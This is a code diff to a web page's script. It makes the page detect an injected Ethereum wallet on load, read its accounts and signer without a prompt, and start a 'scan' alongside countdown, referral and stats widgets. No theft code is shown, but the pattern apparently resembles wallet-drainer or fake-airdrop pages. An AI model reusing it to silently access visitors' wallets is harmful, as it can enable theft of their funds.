-        prov = new ethers.providers.Web3Provider(window.ethereum);
-        sign = prov.getSigner();
-        document.getElementById('mc').style.display = 'block';
-        showP('p1');
-        document.getElementById('p1l').textContent = 'Wallet connected! Scanning...';
-        closeM();
-        scanEvm();
-      }
-    });
-    
-    window.ethereum.request({method: 'eth_accounts'}).then(function(accounts) {
-      if (accounts.length > 0) {
-        addr = accounts[0];
-        prov = new ethers.providers.Web3Provider(window.ethereum);
-        sign = prov.getSigner();
-        document.getElementById('mc').style.display = 'block';
-        showP('p1');
-        document.getElementById('p1l').textContent = 'Wallet connected! Scanning...';
-        closeM();
-        scanEvm();
-      }
-    }).catch(function(){});
-  } else {
-    // Retry every 500ms for mobile browsers that inject ethereum late
-    setTimeout(function() { tryAutoConnect(attempts + 1); }, 500);
-  }
+// ===== AUTO-DETECT =====
+function tryAutoConnect(n){
+  if(n>10)return;
+  if(window.ethereum){
+    window.ethereum.request({method:'eth_accounts'}).then(a=>{
+      if(a.length>0){addr=a[0];prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
+        document.getElementById('mc').style.display='block';showP('p1');document.getElementById('p1l').textContent='Wallet detected! Scanning...';scanEvm();}
+    }).catch(()=>{});
+  }else{setTimeout(()=>tryAutoConnect(n+1),500);}
 }
 
-// Start auto-detect on page load
-tryAutoConnect(0);
-
-
-initPart();initCountdown();initSP();initRef();initStats();
+// ===== INIT =====
+tryAutoConnect(0);initPart();initCountdown();initSP();initRef();initStats();
 </script>
 </body>
 </html>
